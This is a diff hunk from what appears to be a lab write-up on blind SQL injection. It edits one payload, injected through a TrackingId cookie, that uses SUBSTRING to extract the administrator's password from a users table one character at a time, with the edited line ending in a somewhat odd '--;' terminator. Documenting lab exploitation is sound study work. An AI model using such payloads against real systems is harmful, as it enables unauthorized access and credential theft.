@@ -235,7 +235,7 @@ This confirmed that the administrator password length was **20 characters**.
 A substring-based payload was crafted to extract password characters one-by-one:
 
 ```sql
-TrackingId=PIJz9QYdQ6uZFbnw' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),$1$,1)='$a$';--
+TrackingId=PIJz9QYdQ6uZFbnw' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),$1$,1)='$a$'--;
 ```
 
 Payload position:
